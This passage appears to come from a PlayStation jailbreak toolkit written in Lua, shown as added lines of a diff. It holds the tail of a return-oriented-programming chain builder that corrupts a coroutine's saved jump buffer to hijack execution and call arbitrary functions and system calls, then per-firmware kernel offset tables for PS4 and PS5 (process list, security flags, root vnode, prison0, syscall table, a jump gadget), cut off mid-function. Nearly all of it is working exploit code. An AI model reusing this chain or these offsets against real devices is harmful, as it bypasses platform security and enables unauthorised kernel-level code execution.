+    self:push(gadgets["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"])
+end
+
+function ropchain:push_set_rax_from_memory(addr)
+    self:push_set_rax(addr)
+    self:push(gadgets["mov rax, [rax]; ret"])
+end
+
+function ropchain:push_store_eax_into_memory(addr)
+    self:push_set_rdi(addr)
+    self:push(gadgets["mov [rdi], eax; ret"])
+end
+
+function ropchain:push_store_rax_data_and_add_into_memory(addr, num)
+    self:push(gadgets["mov rax, [rax]; ret"])
+    self:push_add_to_rax(num)
+    self:push_set_rdi(addr)
+    self:push(gadgets["mov [rdi], rax; ret"])
+end
+
+function ropchain:push_store_rax_data_into_memory(addr)
+    self:push(gadgets["mov rax, [rax]; ret"])
+    self:push_set_rdi(addr)
+    self:push(gadgets["mov [rdi], rax; ret"])
+end
+
+function ropchain:push_store_rax_into_memory(addr)
+    self:push_set_rdi(addr)
+    self:push(gadgets["mov [rdi], rax; ret"])
+end
+
+function ropchain:push_store_rcx_into_memory(addr) -- clobbers rax
+    self:push_set_rax(addr - 0x8)
+    self:push(gadgets["mov [rax + 8], rcx; ret"])
+end
+
+function ropchain:push_store_rdx_into_memory(addr) -- clobbers rax
+    self:push_set_rax(addr - 0x28)
+    self:push(gadgets["mov [rax + 0x28], rdx; ret"])
+end
+
+function ropchain:push_store_rdi_into_memory(addr) -- clobbers rcx
+    self:push_set_rcx(addr - 0xa0)
+    self:push(gadgets["mov [rcx + 0xa0], rdi; ret"])
+end
+
+function ropchain:push_add_to_rax(num)  -- clobbers r8
+    self:push_set_r8(num)
+    self:push(gadgets["add rax, r8; ret"])
+end
+
+function ropchain:push_add_dword_memory_with_eax(addr)
+    self:push_set_rbx(addr)
+    self:push(gadgets["add [rbx], eax; ret"])
+end
+
+function ropchain:push_add_dword_memory_with_ecx(addr)
+    self:push_set_rbx(addr)
+    self:push(gadgets["add [rbx], ecx; ret"])
+end
+
+function ropchain:push_add_dword_memory_with_edi(addr)
+    self:push_set_rbx(addr)
+    self:push(gadgets["add [rbx], edi; ret"])
+end
+
+function ropchain:push_add_dword_memory(addr, num)
+    if gadgets["add [rbx], eax; ret"] then
+        self:push_set_r
+ax(uint64(num).l)
+        self:push_add_dword_memory_with_eax(addr)
+    elseif gadgets["add [rbx], ecx; ret"] then
+        self:push_set_rcx(uint64(num).l)
+        self:push_add_dword_memory_with_ecx(addr)
+    else
+        self:push_set_rdi(uint64(num).l)
+        self:push_add_dword_memory_with_edi(addr)
+    end
+end
+
+function ropchain:push_add_atomic_qword(addr, val)
+    self:push_set_rdx(0) -- some receive a 3rd argument and have a switch case
+    self:push_set_rsi(val)
+    self:push_set_rdi(addr)
+    self:push(libc_addrofs.Atomic_fetch_add_8)
+end
+
+function ropchain:push_increment_atomic_qword(addr)
+    self:push_add_atomic_qword(addr, 1)
+end
+
+function ropchain:push_decrement_atomic_qword(addr)
+    self:push_add_atomic_qword(addr, -1)
+end
+
+function ropchain:push_write_dword_memory(addr, v)
+    self:push_set_rax(v)
+    self:push_store_eax_into_memory(addr)
+end
+
+function ropchain:push_write_qword_memory(addr, v)  -- clobbers rdi
+    self:push_set_rax(v)
+    self:push_store_rax_into_memory(addr)
+end
+
+function ropchain:push_set_reg_from_reg(target_reg, src_reg)  -- clobbers rdi
+
+    if not (src_reg == "rax" or src_reg == "rdi") then
+        error("ropchain:push_set_reg_from_reg() accepts only rax or rdi as source reg")
+    end
+
+    local disp = (target_reg == "r9") and 0x30 or 0x20
+    self["push_store_" .. src_reg .. "_into_memory"](self, self:get_rsp() + disp)  -- overwrite pop reg value
+    self["push_set_" .. target_reg](self, 0)
+end
+
+function ropchain:push_set_reg_from_rax(reg)
+    self:push_set_reg_from_reg(reg, "rax")
+end
+
+function ropchain:push_set_reg_from_rdi(reg)
+    self:push_set_reg_from_reg(reg, "rdi")
+end
+
+function ropchain:push_set_reg_from_memory(reg, addr)
+    self:push_set_rax_from_memory(addr)
+    self:push_set_reg_from_rax(reg)
+end
+
+function ropchain:create_hole(hole_size)
+    self:push_set_rsp(self:get_rsp() + 0x10 + hole_size)
+    self.stack_offset = self.stack_offset + hole_size
+end
+
+function ropchain:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
+    if rdi then self:push_set_rdi(rdi) end
+    if rsi then self:push_set_rsi(rsi) end
+    if rdx then self:push_set_rdx(rdx) end
+    if rcx then self:push_set_rcx(rcx) end
+    if r8 then self:push_set_r8(r8) end
+    if r9 then self:push_set_r9(r9) end
+end
+
+function ropchain:push_syscall_raw(syscall, prep_arg_callback)
+
+    assert(syscall.fn_addr and syscall.syscall_no)
+
+    local push_size = 0
+    local push_cb = function()
+        self:push_write_qword_memory(self:get_rsp() + push_size, syscall.fn_addr)
+        if prep_arg_callback then
+            prep_arg_callback()
+        end
+        self:push_set_rax(syscall.syscall_no)
+        self:create_hole(0x10)
+    end
+
+    push_size = self:mock_push(push_cb)
+    push_cb()
+
+    self:push(0) -- will be overwritten
+end
+
+function ropchain:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
+    self:push_syscall_raw(syscall, function()
+        self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
+    end)
+end
+
+function ropchain:push_syscall_with_ret(syscall, rdi, rsi, rdx, rcx, r8, r9)
+    self:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
+    self:push_store_retval()
+end
+
+-- if `is_rip_ptr` is set, rip is assumed to be ptr to the real address
+function ropchain:push_fcall_raw(rip, prep_arg_callback, is_rip_ptr)
+
+    local fcall_stub = self.fcall_stub
+
+    if is_rip_ptr then
+        self:push_set_rax_from_memory(rip)
+        self:push_store_rax_into_memory(fcall_stub.fn_addr)
+    else
+        self:push_write_qword_memory(fcall_stub.fn_addr, rip)
+    end
+
+    local push_size = 0
+    local push_cb = function()
+        
+        -- where to jmp after fcall stub
+        self:push_write_qword_memory(fcall_stub.return_addr, self:get_rsp() + push_size)
+        
+        if prep_arg_callback then
+            prep_arg_callback()
+        end
+        
+        -- jmp to fcall stub
+        self:push_set_rsp(fcall_stub.fn_addr)
+    end
+
+    push_size = self:mock_push(push_cb)
+    push_cb()
+end
+
+function ropchain:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
+
+    self:push_fcall_raw(rip, function()
+        self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
+    end)
+end
+
+function ropchain:push_fcall_with_ret(rip, rdi, rsi, rdx, rcx, r8, r9)
+    self:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
+    self:push_store_retval()
+end
+
+function ropchain:push_store_retval()
+    local buf = memory.alloc(8)
+    table.insert(self.retval_addr, buf)
+    self:push_store_rax_into_memory(buf)
+end
+
+function ropchain:get_last_retval_addr()
+    return self.retval_addr[#self.retval_addr]
+end
+
+function ropchain:dispatch_jumptable_with_rax_index(jump_table)
+
+    self:push_set_rcx(3)
+    self:push(gadgets["shl rax, cl; ret"])
+
+    self:push_add_to_rax(jump_table)
+    self:push(gadgets["mov rax, [rax]; ret"])
+
+    self:push_set_reg_from_rax("rsp")
+end
+
+-- only unsigned 32-bit comparison is supported
+function ropchain:create_branch(value_address, op, compare_value)
+
+    self:push_set_rax(value_address)
+    self:push_set_rbx(compare_value)
+    self:push(gadgets["cmp [rax], ebx; ret"])
+
+    self:push_set_rax(0)
+
+    if op == "==" then
+        self:push(gadgets["sete al; ret"])
+    elseif op == "~=" then
+        self:push(gadgets["setne al; ret"])
+    elseif op == ">" then
+        self:push(gadgets["seta al; ret"])
+    elseif op == "<" then
+        self:push(gadgets["setb al; ret"])
+    else
+        errorf("ropchain:create_branch: invalid op (%s)", op)
+    end
+
+    local jump_table = memory.alloc(0x10)
+    self:dispatch_jumptable_with_rax_index(jump_table)
+    return jump_table
+end
+
+-- gen "if statement" style code 
+function ropchain:gen_conditional(value_address, op, compare_value, callback)
+
+    local jump_table = self:create_branch(value_address, op, compare_value)
+    
+    -- if memory[value_address] <op> compare_value then
+        local jmp_cond_true = self:get_rsp()
+        callback()
+    -- end
+
+    local jmp_cond_false = self:get_rsp()
+
+    memory.write_multiple_qwords(jump_table, {
+        jmp_cond_false, -- comparison false
+        jmp_cond_true, -- comparison true
+    })
+end
+
+-- gen "while statement" style loop
+function ropchain:gen_loop(value_address, op, compare_value, callback)
+
+    local loopback = self:get_rsp()
+    local jump_table = self:create_branch(value_address, op, compare_value)
+    
+    -- while memory[value_address] <op> compare_value do
+        local jmp_cond_true = self:get_rsp()
+        callback()
+        self:push_set_rsp(loopback)
+    -- end
+   
+    local jmp_cond_false = self:get_rsp()
+
+    memory.write_multiple_qwords(jump_table, {
+        jmp_cond_false, -- comparison false
+        jmp_cond_true, -- comparison true
+    })
+end
+
+function ropchain:restore_through_longjmp(jmpbuf)
+    if not self.finalized then
+        -- restore execution through longjmp
+        self.jmpbuf = jmpbuf or memory.alloc(0x60)
+        self:push_fcall(libc_addrofs.longjmp, self.jmpbuf, 0)
+        self.finalized = true
+    end
+end
+
+-- corrupt coroutine's jmpbuf for code execution
+function ropchain:execute_through_coroutine()
+
+    if not self.finalized then
+        error("restore_through_longjmp need to be run first")
+    end
+
+    local run_hax = function(lua_state_addr)
+
+        -- backup original jmpbuf
+        local jmpbuf_addr = memory.read_qword(lua_state_addr+0xa8) + 0x8
+        memory.memcpy(self.jmpbuf, jmpbuf_addr, 0x60)
+
+        -- overwrite registers in jmpbuf
+        memory.write_qword(jmpbuf_addr + 0, gadgets["ret"])    -- rip
+        memory.write_qword(jmpbuf_addr + 16, self.stack_base)  -- rsp
+
+        assert(false) -- trigger exception
+    end
+
+    -- run ropchain
+    local victim = coroutine.create(run_hax)
+    coroutine.resume(victim, lua.addrof(victim))
+
+    local retval = self:get_last_retval_addr()
+    if retval then
+        return memory.read_qword(retval)
+    end
+end
+
+--
+-- fcall class
+--
+-- helper to execute function or system call through rop
+--
+
+fcall = {}
+fcall.__index = fcall
+
+setmetatable(fcall, {
+    __call = function(_, fn_addr, syscall_no)  -- make class callable as constructor
+       
+ return fcall:new(fn_addr, syscall_no)
+    end
+})
+
+function fcall:new(fn_addr, syscall_no)
+
+    assert(fn_addr, "invalid function address")
+    
+    if not (fcall.chain or native_invoke) then
+        fcall.create_initial_chain()
+    end
+
+    local self = setmetatable({}, fcall)
+    self.fn_addr = fn_addr
+    self.syscall_no = syscall_no
+    return self
+end
+
+function fcall.create_initial_chain()
+
+    local arg_addr = {
+        fn_addr = memory.alloc(8),
+        syscall_no = memory.alloc(8),
+        rdi = memory.alloc(8),
+        rsi = memory.alloc(8),
+        rdx = memory.alloc(8),
+        rcx = memory.alloc(8),
+        r8 = memory.alloc(8),
+        r9 = memory.alloc(8),
+    }
+
+    local chain = ropchain()
+
+    local prep_arg_callback = function()
+        chain:push_set_reg_from_memory("r9", arg_addr.r9)
+        chain:push_set_reg_from_memory("r8", arg_addr.r8)
+        chain:push_set_reg_from_memory("rcx", arg_addr.rcx)
+        chain:push_set_reg_from_memory("rdx", arg_addr.rdx)
+        chain:push_set_reg_from_memory("rsi", arg_addr.rsi)
+        chain:push_set_reg_from_memory("rdi", arg_addr.rdi)
+        chain:push_set_rax_from_memory(arg_addr.syscall_no)
+    end
+    
+    chain:push_fcall_raw(arg_addr.fn_addr, prep_arg_callback, true)
+    chain:push_store_retval()
+    
+    chain:restore_through_longjmp()
+
+    fcall.arg_addr = arg_addr
+    fcall.chain = chain
+end
+
+function fcall:__call(rdi, rsi, rdx, rcx, r8, r9)
+    if native_invoke then
+        return native.fcall_with_rax(self.fn_addr, self.syscall_no, rdi, rsi, rdx, rcx, r8, r9)
+    else
+        local arg_addr = fcall.arg_addr
+        memory.write_qword(arg_addr.fn_addr, self.fn_addr)
+        memory.write_qword(arg_addr.syscall_no, self.syscall_no or 0)
+        memory.write_qword(arg_addr.rdi, lua.resolve_value(rdi or 0))
+        memory.write_qword(arg_addr.rsi, lua.resolve_value(rsi or 0))
+        memory.write_qword(arg_addr.rdx, lua.resolve_value(rdx or 0))
+        memory.write_qword(arg_addr.rcx, lua.resolve_value(rcx or 0))
+        memory.write_qword(arg_addr.r8, lua.resolve_value(r8 or 0))
+        memory.write_qword(arg_addr.r9, lua.resolve_value(r9 or 0))
+        return fcall.chain:execute_through_coroutine()
+    end
+end
+
+function fcall:__tostring()
+    return string.format("address @ %s\n%s", hex(self.fn_addr), tostring(fcall.chain))
+end
+
+--- END ropchain.lua ---
+
+--- /savedata0/kernel_offset.lua (15754 bytes) ---
+
+-- kernel offsets
+-- credit to @hammer-83 for these offsets
+-- https://github.com/hammer-83/ps5-jar-loader/blob/main/sdk/src/main/java/org/ps5jb/sdk/core/kernel/KernelOffsets.java
+
+ps5_kernel_offset_list = {
+
+    [{ "1.00", "1.01", "1.02" }] = {
+
+        DATA_BASE = 0x01B40000,
+        DATA_SIZE = 0x08631930,
+
+        DATA_BASE_DYNAMIC = 0x00000000,
+        DATA_BASE_TO_DYNAMIC = 0x0658BB58,
+        DATA_BASE_ALLPROC = 0x026D1BF8,
+        DATA_BASE_SECURITY_FLAGS = 0x06241074,
+        DATA_BASE_ROOTVNODE = 0x06565540,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x02F9F2B8,
+        DATA_BASE_DATA_CAVE = 0x05F20000,
+        DATA_BASE_GVMSPACE = 0x06202E70,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+    
+    [{ "1.05", "1.10", "1.11", "1.12", "1.13", "1.14" }] = {
+
+        DATA_BASE = 0x01B40000,
+        DATA_SIZE = 0x08631930,
+
+        DATA_BASE_DYNAMIC = 0x00000000,
+        DATA_BASE_TO_DYNAMIC = 0x0658BB58,
+        DATA_BASE_ALLPROC = 0x026D1C18,
+        DATA_BASE_SECURITY_FLAGS = 0x06241074,
+        DATA_BASE_ROOTVNODE = 0x06565540,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x02F9F328,
+        DATA_BASE_DATA_CAVE = 0x05F20000,
+        DATA_BASE_GVMSPACE = 0x06202E70,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+    
+    [{ "2.00", "2.20", "2.25", "2.26", "2.30", "2.50", "2.70" }] = {
+
+        DATA_BASE = 0x01B80000,
+        DATA_SIZE = 0x087E1930,
+
+        DATA_BASE_DYNAMIC = 0x00000000,
+        DATA_BASE_TO_DYNAMIC = 0x06739B88,
+        DATA_BASE_ALLPROC = 0x02701C28,
+        DATA_BASE_SECURITY_FLAGS = 0x063E1274,
+        DATA_BASE_ROOTVNODE = 0x067134C0,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x031338C8,
+        DATA_BASE_DATA_CAVE = 0x060C0000,  -- Use same as Specter's Byepervisor repo for interop
+        DATA_BASE_GVMSPACE = 0x063A2EB0,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+
+    [{ "3.00", "3.20", "3.21" }] = {
+
+        DATA_BASE = 0x0BD0000,
+        DATA_SIZE = 0x08871930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x067D1B90,
+        DATA_BASE_ALLPROC = 0x0276DC58,
+        DATA_BASE_SECURITY_FLAGS = 0x06466474,
+        DATA_BASE_ROOTVNODE = 0x067AB4C0,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x031BE218,
+        DATA_BASE_DATA_CAVE = 0x06140000,  -- Unconfirmed
+        DATA_BASE_GVMSPACE = 0x06423F80,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+
+    [{ "4.00", "4.02", "4.03", "4.50", "4.51" }] = {
+
+        DATA_BASE = 0x0C00000,
+        DATA_SIZE = 0x087B1930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x0670DB90,
+        DATA_BASE_ALLPROC = 0x027EDCB8,
+        DATA_BASE_SECURITY_FLAGS = 0x06506474,
+        DATA_BASE_ROOTVNODE = 0x066E74C0,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x03257A78,
+        DATA_BASE_DATA_CAVE = 0x06C01000,  -- Unconfirmed
+        DATA_BASE_GVMSPACE = 0x064C3F80,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+
+    [{ "5.00", "5.02" , "5.10"}] = {
+
+        DATA_BASE = 0x0C40000,
+        DATA_SIZE = 0x08921930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x06879C00,
+        DATA_BASE_ALLPROC = 0x0291DD00,
+        DATA_BASE_SECURITY_FLAGS = 0x066466EC,
+        DATA_BASE_ROOTVNODE = 0x06853510,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x03398A88,
+        DATA_BASE_DATA_CAVE = 0x06320000,  -- Unconfirmed
+        DATA_BASE_GVMSPACE = 0x06603FB0,
+
+        PMAP_STORE_PML4PML4I = -0x105C,
+        PMAP_STORE_DMPML4I = 0x29C,
+        PMAP_STORE_DMPDPI = 0x2A0,
+    },
+
+    [{ "5.50" }] = {
+
+        DATA_BASE = 0x0C40000,
+        DATA_SIZE = 0x08921930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x06879C00,
+        DATA_BASE_ALLPROC = 0x0291DD00,
+   
+     DATA_BASE_SECURITY_FLAGS = 0x066466EC,
+        DATA_BASE_ROOTVNODE = 0x06853510,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x03394A88,
+        DATA_BASE_DATA_CAVE = 0x06320000,  -- Unconfirmed
+        DATA_BASE_GVMSPACE = 0x06603FB0,
+
+        PMAP_STORE_PML4PML4I = -0x105C,
+        PMAP_STORE_DMPML4I = 0x29C,
+        PMAP_STORE_DMPDPI = 0x2A0,
+    },
+    
+    [{ "6.00", "6.02", "6.50" }] = {
+
+        DATA_BASE = 0x0C60000,  -- Unconfirmed
+        DATA_SIZE = 0x08861930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x067C5C10,
+        DATA_BASE_ALLPROC = 0x02869D20,
+        DATA_BASE_SECURITY_FLAGS = 0x065968EC,
+        DATA_BASE_ROOTVNODE = 0x0679F510,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x032E4358,
+        DATA_BASE_DATA_CAVE = 0x06270000,  -- Unconfirmed
+        DATA_BASE_GVMSPACE = 0x065540F0,
+
+        PMAP_STORE_PML4PML4I = -0x105C,
+        PMAP_STORE_DMPML4I = 0x29C,
+        PMAP_STORE_DMPDPI = 0x2A0,
+    },
+
+    [{ "7.00", "7.01", "7.20", "7.40", "7.60", "7.61" }] = {
+
+        DATA_BASE = 0x0C50000,
+        DATA_SIZE = 0x05191930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x030EDC40,
+        DATA_BASE_ALLPROC = 0x02859D50,
+        DATA_BASE_SECURITY_FLAGS = 0x00AC8064,
+        DATA_BASE_ROOTVNODE = 0x030C7510,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x02E2C848,
+        DATA_BASE_DATA_CAVE = 0x050A1000,  -- Unconfirmed
+        DATA_BASE_GVMSPACE = 0x02E76090,
+
+        PMAP_STORE_PML4PML4I = -0x10AC,
+        PMAP_STORE_DMPML4I = 0x29C,
+        PMAP_STORE_DMPDPI = 0x2A0,
+    },
+    
+        [{ "8.00", "8.20", "8.40", "8.60" }] = {
+
+        DATA_BASE = 0xC70000,
+        DATA_SIZE = nil,
+
+        DATA_BASE_DYNAMIC = 0x10000,
+        DATA_BASE_TO_DYNAMIC = nil,
+        DATA_BASE_ALLPROC = 0x2875D50,
+        DATA_BASE_SECURITY_FLAGS = 0xAC3064,
+        DATA_BASE_ROOTVNODE = 0x30FB510,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x2E48848,
+        DATA_BASE_DATA_CAVE = nil,
+        DATA_BASE_GVMSPACE = 0x2EAA090,
+    
+        PMAP_STORE_PML4PML4I = nil,
+        PMAP_STORE_DMPML4I = nil,
+        PMAP_STORE_DMPDPI = nil,
+    },
+
+    [{ "9.00" }] = {
+
+        DATA_BASE = 0xCA0000,
+        DATA_SIZE = nil,
+
+        DATA_BASE_DYNAMIC = 0x10000,
+        DATA_BASE_TO_DYNAMIC = nil,
+        DATA_BASE_ALLPROC = 0x2755D50,
+        DATA_BASE_SECURITY_FLAGS = 0xD72064,
+        DATA_BASE_ROOTVNODE = 0x2FDB510,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x2D28B78,
+        DATA_BASE_DATA_CAVE = nil,
+        DATA_BASE_GVMSPACE = 0x2D8A570,
+
+        PMAP_STORE_PML4PML4I = nil,
+        PMAP_STORE_DMPML4I = nil,
+        PMAP_STORE_DMPDPI = nil,
+
+    },
+
+    [{ "9.05", "9.20", "9.40", "9.60" }] = {
+
+        DATA_BASE = 0xCA0000,
+        DATA_SIZE = nil,
+
+        DATA_BASE_DYNAMIC = 0x10000,
+        DATA_BASE_TO_DYNAMIC = nil,
+        DATA_BASE_ALLPROC = 0x2755D50,
+        DATA_BASE_SECURITY_FLAGS = 0xD73064,
+        DATA_BASE_ROOTVNODE = 0x2FDB510,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x2D28B78,
+        DATA_BASE_DATA_CAVE = nil,
+        DATA_BASE_GVMSPACE = 0x2D8A570,
+
+        PMAP_STORE_PML4PML4I = nil,
+        PMAP_STORE_DMPML4I = nil,
+        PMAP_STORE_DMPDPI = nil,
+
+    },
+
+    [{ "10.00", "10.01" }] = {
+
+        DATA_BASE = 0xCC0000,
+        DATA_SIZE = nil,
+
+        DATA_BASE_DYNAMIC = 0x10000,
+        DATA_BASE_TO_DYNAMIC = nil,
+        DATA_BASE_ALLPROC = 0x2765D70,
+        DATA_BASE_SECURITY_FLAGS = 0xD79064,
+        DATA_BASE_ROOTVNODE = 0x2FA3510,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x2CF0EF8,
+        DATA_BASE_DATA_CAVE = nil,
+        DATA_BASE_GVMSPACE = 0x2D52570,
+
+        PMAP_STORE_PML4PML4I = nil,
+        PMAP_STORE_DMPML4I = nil,
+        PMAP_STORE_DMPDPI = nil,
+    },
+}
+
+ps4_kernel_offset_list = {
+    [{ "9.00" }] = {
+        EVF_OFFSET          = 0x7f6f27,
+        PRISON0             = 0x111f870,
+        ROOTVNODE           = 0x21eff20,
+        TARGET_ID_OFFSET    = 0x221688d,
+        SYSENT_661_OFFSET   = 0x1107f00,
+        JMP_RSI_GADGET      = 0x4c7ad
+    },
+    [{ "9.03", "
+9.04" }] = {
+        EVF_OFFSET          = 0x7f4ce7,
+        PRISON0             = 0x111b840,
+        ROOTVNODE           = 0x21ebf20,
+        TARGET_ID_OFFSET    = 0x221288d,
+        SYSENT_661_OFFSET   = 0x1103f00,
+        JMP_RSI_GADGET      = 0x5325b
+    },
+    [{ "9.50", "9.51", "9.60" }] = {
+        EVF_OFFSET          = 0x769a88,
+        PRISON0             = 0x11137d0,
+        ROOTVNODE           = 0x21a6c30,
+        TARGET_ID_OFFSET    = 0x221a40d,
+        SYSENT_661_OFFSET   = 0x1100ee0,
+        JMP_RSI_GADGET      = 0x15a6d
+    },
+    [{ "10.00", "10.01" }] = {
+        EVF_OFFSET          = 0x7b5133,
+        PRISON0             = 0x111b8b0,
+        ROOTVNODE           = 0x1b25bd0,
+        TARGET_ID_OFFSET    = 0x1b9e08d,
+        SYSENT_661_OFFSET   = 0x110a980,
+        JMP_RSI_GADGET      = 0x68b1
+    },
+    [{ "10.50", "10.70", "10.71" }] = {
+        EVF_OFFSET          = 0x7a7b14,
+        PRISON0             = 0x111b910,
+        ROOTVNODE           = 0x1bf81f0,
+        TARGET_ID_OFFSET    = 0x1be460d,
+        SYSENT_661_OFFSET   = 0x110a5b0,
+        JMP_RSI_GADGET      = 0x50ded
+    },
+    [{ "11.00" }] = { -- credit: @egycnq
+        EVF_OFFSET          = 0x7fc26f,
+        PRISON0             = 0x111f830,
+        ROOTVNODE           = 0x2116640,
+        TARGET_ID_OFFSET    = 0x221c60d,
+        SYSENT_661_OFFSET   = 0x1109350,
+        JMP_RSI_GADGET      = 0x71a21
+    },
+    [{ "11.02" }] = {
+        EVF_OFFSET          = 0x7fc22f,
+        PRISON0             = 0x111f830,
+        ROOTVNODE           = 0x2116640,
+        TARGET_ID_OFFSET    = 0x221c60d,
+        SYSENT_661_OFFSET   = 0x1109350,
+        JMP_RSI_GADGET      = 0x71a21
+    },
+    [{ "11.50", "11.52" }] = {
+        EVF_OFFSET          = 0x784318,
+        PRISON0             = 0x111fa18,
+        ROOTVNODE           = 0x2136e90,
+        TARGET_ID_OFFSET    = 0x21cc60d,
+        SYSENT_661_OFFSET   = 0x110a760,
+        JMP_RSI_GADGET      = 0x704d5
+    },
+    [{ "12.00", "12.02" }] = { -- credit: @egycnq
+        EVF_OFFSET          = 0x784798,
+        PRISON0             = 0x111fa18,
+        ROOTVNODE           = 0x2136e90,
+        TARGET_ID_OFFSET    = 0x21cc60d,
+        SYSENT_661_OFFSET   = 0x110a760,
+        JMP_RSI_GADGET      = 0x47b31
+    }
+}
+
+function get_ps5_kernel_offset()
+
+    local kernel_offset = {}
+
+    for fw_list, offsets in pairs(ps5_kernel_offset_list) do
+        for i, check_fw in ipairs(fw_list) do
+            if check_fw == FW_VERSION then
+                kernel_offset = offsets
+                kernel_offset.DATA_BASE_TARGET_ID = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x09
+                kernel_offset.DATA_BASE_QA_FLAGS = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x24
+                kernel_offset.DATA_BASE_UTOKEN_FLAGS = kernel_offset.DATA_BASE_SECURITY_FLAGS + 0x8C
+                break
+            end
+        end
+    end
+
+    -- static structure offsets
+    -- note: the one marked with -1 will be resolved at runtime
+
+    -- proc structure
+    kernel_offset.PROC_FD = 0x48
+    kernel_offset.PROC_PID = 0xbc
+    kernel_offset.PROC_VM_SPACE = 0x200
+    kernel_offset.PROC_COMM = -1
+    kernel_offset.PROC_SYSENT = -1
+
+    -- filedesc
+    kernel_offset.FILEDESC_OFILES = 0x8
+    kernel_offset.SIZEOF_OFILES = 0x30
+
+    -- vmspace structure
+    kernel_offset.VMSPACE_VM_PMAP = -1
+    kernel_offset.VMSPACE_VM_VMID = -1
+
+    -- pmap structure
+    kernel_offset.PMAP_CR3 = 0x28
+
+    -- gpu vmspace structure
+    kernel_offset.SIZEOF_GVMSPACE = 0x100
+    kernel_offset.GVMSPACE_START_VA = 0x8
+    kernel_offset.GVMSPACE_SIZE = 0x10
+    kernel_offset.GVMSPACE_PAGE_DIR_VA = 0x38
+
+    -- net
+    kernel_offset.SO_PCB = 0x18
+    kernel_offset.INPCB_PKTOPTS = 0x120
+
+    return kernel_offset
+end
+
+function get_ps4_kernel_offset()
+
+    local kernel_offset = {}
+
+    for fw_list, offsets in pairs(ps4_kernel_offset_list) do
+        for i, check_fw in ipairs(fw_list) do
+            if check_fw == FW_VERSION then
+                kernel_offset = offsets
+              
+  break
+            end
+        end
+    end
+
+    -- proc structure
+    kernel_offset.PROC_FD = 0x48
+    kernel_offset.PROC_PID = 0xb0
+    kernel_offset.PROC_VM_SPACE = 0x200
+    kernel_offset.PROC_COMM = -1
+    kernel_offset.PROC_SYSENT = -1
+
+    -- filedesc
+    kernel_offset.FILEDESC_OFILES = 0x0
+    kernel_offset.SIZEOF_OFILES = 0x8
+    
+    -- vmspace structure
+    kernel_offset.VMSPACE_VM_PMAP = -1
+    kernel_offset.VMSPACE_VM_VMID = -1
+
+    -- pmap structure
+    kernel_offset.PMAP_CR3 = 0x28
+
+    -- net
+    kernel_offset.SO_PCB = 0x18
+    kernel_offset.INPCB_PKTOPTS = 0x118
+
+    return kernel_offset
+end
+
+function get_kernel_offset()
+    if PLATFORM == "ps4" then
+        return get_ps4_kernel_offset()
+    elseif PLATFORM == "ps5" then
+        return get_ps5_kernel_offset()
+    end
+end
+
+-- find some structure offsets at runtime
+function update_kernel_offsets()
+
+    local offsets = find_additional_offsets()
+
+    for k,v in pairs(offsets) do
+        kernel_offset[k] = v
+    end
+end
+
+-- credit: @hammer-83
+function find_vmspace_pmap_offset()
+
+    local vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE)
+    
+    -- Note, this is the offset of vm_space.vm_map.pmap on 1.xx.
+    -- It is assumed that on higher firmwares it's only increasing.
+    local cur_scan_offset = 0x1C8
+    
+    for i=1,6 do
+        local scan_val = kernel.read_qword(vmspace + cur_scan_offset + (i * 8))
+        local offset_diff = (scan_val - vmspace):tonumber()
+        if offset_diff >= 0x2C0 and offset_diff <= 0x2F0 then
+            return cur_scan_offset + (i * 8)
+        end
+    end
+
+    error("failed to find VMSPACE_VM_PMAP offset")
+end
+
+
+-- credit: @hammer-83
+function find_vmspace_vmid_offset()
+
+    local vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE)
+
+    -- Note, this is the offset of vm_space.vm_map.vmid on 1.xx.
+    -- It is assumed that on higher firmwares it's only increasing.
+    local cur_scan_offset = 0x1D4
+    
+    for i=1,8 do
+        local scan_offset = cur_scan_offset + (i * 4)
